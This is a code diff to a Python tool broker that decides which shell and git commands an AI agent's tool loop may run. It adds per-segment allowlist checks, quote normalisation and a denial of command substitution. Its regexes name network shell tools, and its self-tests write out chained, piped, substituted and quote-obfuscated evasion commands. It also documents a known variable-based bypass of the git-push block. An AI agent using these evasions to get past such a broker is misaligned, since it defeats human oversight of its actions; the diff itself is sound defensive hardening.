@@ -36,6 +36,9 @@ import yaml
 # (worktree-only writable mount, HOME изолирован, сеть off, лимиты) = контейнер — НЕ реализован.
 # Не давать --engine pipeline с живой моделью доступ к ценному приватному репо без надзора.
 SHELL_TIMEOUT_DEFAULT = 300   # сек: shell-команда не висит вечно
+# v2.85: хвост вывода shell для evidence. 400 было мало — сводка теста / список упавших node-id
+# (для structured-id baseline-diff) часто НЕ попадали в окно -> регрессии терялись (fail-open).
+SHELL_OUTPUT_TAIL = 4000
 
 PKG = Path(__file__).resolve().parents[1]
 
@@ -112,9 +115,23 @@ def _under(path: str, prefix: str) -> bool:
 # НЕ настоящий сетевой jail (это контейнер), но закрывает частые векторы, когда allow_network=False.
 NETWORK_RE = re.compile(r"\b(curl|wget|nc|ncat|netcat|ssh|scp|sftp|telnet|rsync|ftp|"
                         r"nmap|dig|nslookup|http|https)\b", re.I)
-# git push из tool-loop модели запрещён всегда, когда block_push: доставка ветки/PR — только
-# доверенным кодом движка (pr_open), не самой моделью (finding аудита v2.79 P0.2).
+# git push из tool-loop: доставка ветки/PR — только доверенным кодом движка (pr_open), не моделью
+# (finding аудита v2.79 P0.2). ЧЕСТНО (v2.85): это best-effort текстовый денай — quote-обфускацию
+# снимаем нормализацией (_normalize), но ПЕРЕМЕННЫЕ/eval (`p=push; git $p`) статически не ловятся.
+# Жёсткая гарантия недоставки — окружение (нет push-credentials / git-wrapper), не regex.
 GIT_PUSH_RE = re.compile(r"\bgit\b[^\n;&|]*\bpush\b", re.I)
+
+# v2.85: команду в allowlist-режиме проверяем ПОСЕГМЕНТНО (первый бинарь каждого сегмента), иначе
+# chained/piped команды (`pytest && curl`, `x | nc`) обходят allowlist по первому токену.
+_SHELL_SPLIT_RE = re.compile(r"&&|\|\||[;|\n]")
+# подстановка команд / process substitution — статически не проверить -> в allowlist-режиме денай.
+_SUBST_RE = re.compile(r"\$\(|`|<\(|>\(")
+
+
+def _normalize(cmd):
+    """Снять кавычки для текстовых денай-проверок: `git pu\"\"sh` -> `git push` (quote-обфускация).
+    ЧЕСТНО: переменные/eval так не раскрыть — это защита от кавычек, не полный разбор shell."""
+    return (cmd or "").replace('"', "").replace("'", "")
 
 
 class Policy:
@@ -177,13 +194,17 @@ class Policy:
                         "reason": f"'{path}' вне write_scope {self.write_scope}"}
             return {"allow": True, "reason": "запись в пределах write_scope"}
 
-        # shell / git
+        # shell / git. Текстовые денай-проверки — по НОРМАЛИЗОВАННОЙ команде (снятые кавычки),
+        # чтобы `git pu""sh` / `cu"r"l` не обходили денай quote-обфускацией (v2.85).
         cmd = action.get("command") or ""
-        # v2.81 Containment: доставка (git push) — только доверенным движком (pr_open), не моделью
-        if self.block_push and GIT_PUSH_RE.search(cmd):
+        norm = _normalize(cmd)
+        # v2.81 Containment: доставка (git push) — только доверенным движком (pr_open), не моделью.
+        # best-effort (см. GIT_PUSH_RE): ловит кавычки/пробелы, НЕ ловит переменные/eval.
+        if self.block_push and GIT_PUSH_RE.search(norm):
             return {"allow": False,
-                    "reason": "git push из tool-loop запрещён (block_push): доставка только через движок (pr_open)"}
-        if DESTRUCTIVE_RE.search(cmd):
+                    "reason": "git push из tool-loop запрещён (block_push, best-effort): доставка только "
+                              "через движок (pr_open); жёсткая гарантия — окружение без push-credentials"}
+        if DESTRUCTIVE_RE.search(norm):
             if self._level_ok("destructive") and "destructive" in self.approvals:
                 return {"allow": True, "reason": "destructive + approval"}
             return {"allow": False,
@@ -191,40 +212,61 @@ class Policy:
         if op == "shell":
             if self.shell_mode == "off":
                 return {"allow": False, "reason": "shell запрещён политикой (shell_mode=off)"}
-            if not self.allow_network and NETWORK_RE.search(cmd):
+            if not self.allow_network and NETWORK_RE.search(norm):
                 return {"allow": False,
                         "reason": "сетевая команда запрещена (allow_network=False); это не полный "
                                   "jail, а enforceable-денай частых векторов"}
             if self.shell_mode == "allowlist":
-                binary = _first_binary(cmd)
-                if binary not in self.shell_allowlist:
+                # подстановка команд ($()/backtick/<()) — статически не проверить -> денай
+                if _SUBST_RE.search(cmd):
                     return {"allow": False,
-                            "reason": f"'{binary}' не в shell_allowlist {sorted(self.shell_allowlist)}"}
+                            "reason": "подстановка команд ($()/`…`/<()) запрещена в allowlist-режиме "
+                                      "(нельзя статически проверить вложенные бинарники)"}
+                # ПОСЕГМЕНТНО: каждый бинарь после ; && || | должен быть в allowlist (v2.85 —
+                # иначе `pytest && curl` обходил проверку по первому токену)
+                bad = [b for b in _command_binaries(norm) if b not in self.shell_allowlist]
+                if bad:
+                    return {"allow": False,
+                            "reason": f"{bad} не в shell_allowlist {sorted(self.shell_allowlist)}"}
         return {"allow": True, "reason": f"{op} в пределах уровня {self.level}"}
 
 
 # v2.81: типовые dev-инструменты (build/test/pkg + безопасное чтение) для shell_mode=allowlist.
-# Это НЕ jail — модель всё ещё может навредить внутри worktree; но сужает поверхность и
-# отсекает произвольные бинарники. Полная изоляция ФС/сети — контейнер.
+# ЧЕСТНО (v2.85): это сужение ПОВЕРХНОСТИ входных бинарников, НЕ песочница исполнения. Многие из
+# этих инструментов (python3/node/make/npm-scripts/pytest) по своей природе исполняют код репозитория
+# — allowlist их не «обезвреживает», он лишь отсекает ad-hoc посторонние бинарники на входе. Полная
+# изоляция ФС/сети/ресурсов — контейнер. Сырые интерпретаторы shell (bash/sh) УБРАНЫ: `bash -c "…"`
+# — прямой обход без dev-обоснования на верхнем уровне.
 SANDBOX_SHELL_ALLOWLIST = {
-    # пакетные менеджеры / раннеры
+    # пакетные менеджеры / раннеры (исполняют код репо по своей сути — см. коммент выше)
     "npm", "npx", "yarn", "pnpm", "node", "corepack",
     "python", "python3", "pip", "pip3", "poetry", "uv", "pytest", "tox",
     "go", "cargo", "rustc", "mvn", "gradle", "./gradlew", "./mvnw", "make",
     "ruff", "mypy", "flake8", "black", "isort", "eslint", "tsc", "vitest", "jest",
     # безопасное чтение/навигация (модель исследует репо)
     "ls", "cat", "head", "tail", "grep", "rg", "find", "wc", "pwd", "echo",
-    "git", "sed", "awk", "test", "true", "false", "bash", "sh",
+    "git", "sed", "awk", "test", "true", "false",
 }
 
 
 def _first_binary(cmd):
-    """Первый токен команды (бинарь) — для shell_mode=allowlist. Учитывает VAR=val префиксы."""
+    """Первый токен сегмента (бинарь) — для shell_mode=allowlist. Учитывает VAR=val префиксы."""
     for tok in (cmd or "").strip().split():
         if "=" in tok and not tok.startswith(("/", "./", "-")):
             continue                      # env-присваивание FOO=bar перед командой
         return tok
     return ""
+
+
+def _command_binaries(cmd):
+    """Все ведущие бинарники команды по сегментам (split по ; && || |) — для allowlist-проверки.
+    Пустые сегменты (напр. только VAR=val) пропускаются. v2.85: закрывает обход `a && curl`/`a | nc`."""
+    bins = []
+    for seg in _SHELL_SPLIT_RE.split(cmd or ""):
+        b = _first_binary(seg)
+        if b:
+            bins.append(b)
+    return bins
 
 
 def sandbox_policy(child_root=None, write_scope=None, allow_network=True):
@@ -335,7 +377,7 @@ def execute(action: dict, root, policy: Policy) -> dict:
                                    timeout=timeout)
                 ev.update({"ok": r.returncode == 0, "exit_code": r.returncode,
                            "command": action["command"],
-                           "output_tail": (r.stdout + r.stderr)[-400:]})
+                           "output_tail": (r.stdout + r.stderr)[-SHELL_OUTPUT_TAIL:]})
             except subprocess.TimeoutExpired:
                 # finding аудита: без timeout shell мог висеть вечно
                 ev.update({"ok": False, "exit_code": None, "command": action["command"],
@@ -503,6 +545,34 @@ def selftest():
                and not sp.decide({"op": "shell", "command": "nc -l 1234"})["allow"])
         expect("sandbox_policy: git push заблокирован (доставка только движком)",
                not sp.decide({"op": "shell", "command": "git push origin x"})["allow"])
+
+        # v2.85 hardening: посегментная allowlist-проверка (chained/piped обход закрыт)
+        expect("allowlist: chained `pytest && curl` -> DENY (curl вне allowlist)",
+               not sp.decide({"op": "shell", "command": "pytest -q && curl http://evil"})["allow"])
+        expect("allowlist: pipe `cat x | nc host 1` -> DENY (nc вне allowlist)",
+               not sp.decide({"op": "shell", "command": "cat x | nc host 1"})["allow"])
+        expect("allowlist: `ls && wget http://x` -> DENY (wget вне allowlist)",
+               not sp.decide({"op": "shell", "command": "ls && wget http://x"})["allow"])
+        expect("allowlist: подстановка команд `echo $(curl …)` -> DENY",
+               not sp.decide({"op": "shell", "command": "echo $(curl http://x)"})["allow"])
+        expect("allowlist: backtick-подстановка -> DENY",
+               not sp.decide({"op": "shell", "command": "echo `curl http://x`"})["allow"])
+        expect("allowlist: легитимный chained `npm ci && npm test` -> ALLOW",
+               sp.decide({"op": "shell", "command": "npm ci && npm test"})["allow"])
+        expect("allowlist: сырой bash/sh УБРАН из sandbox-набора -> `bash -c …` DENY",
+               not sp.decide({"op": "shell", "command": "bash -c 'curl http://x'"})["allow"])
+        # v2.85: quote-обфускация push/сети снимается нормализацией
+        expect("block_push: quote-обфускация `git pu\"\"sh` поймана (нормализация)",
+               not bp.decide({"op": "shell", "command": 'git pu""sh origin main'})["allow"])
+        nonet2 = Policy(level="execution", allow_network=False)
+        expect("allow_network=False: quote-обфускация `cu\"r\"l` поймана",
+               not nonet2.decide({"op": "shell", "command": 'cu"r"l http://x'})["allow"])
+        # честная граница: переменная/eval статически НЕ ловится (документировано, не тихо)
+        expect("block_push: переменная `p=push; git $p` НЕ ловится (честная граница best-effort)",
+               bp.decide({"op": "shell", "command": "p=push; git $p origin main"})["allow"])
+        # _command_binaries: env-префикс сегмента не сбивает
+        expect("command_binaries: сегменты с VAR=val префиксом -> бинарь сегмента",
+               _command_binaries("CI=1 npm test && ruff check") == ["npm", "ruff"])
 
     print("tool_broker selftest:", "PASS" if ok else "FAIL")
     return 0 if ok else 1
